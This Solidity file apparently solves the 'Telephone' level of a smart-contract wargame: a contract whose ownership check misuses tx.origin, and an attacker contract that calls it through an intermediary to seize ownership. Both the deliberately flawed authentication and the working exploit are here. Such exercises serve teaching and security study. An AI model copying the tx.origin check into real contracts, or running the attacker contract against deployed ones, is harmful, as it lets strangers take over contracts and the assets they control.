// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Telephone_Attacker {
    function changeOwner(address _telephone, address _owner) public {
        Telephone(_telephone).changeOwner(_owner);
    }
}
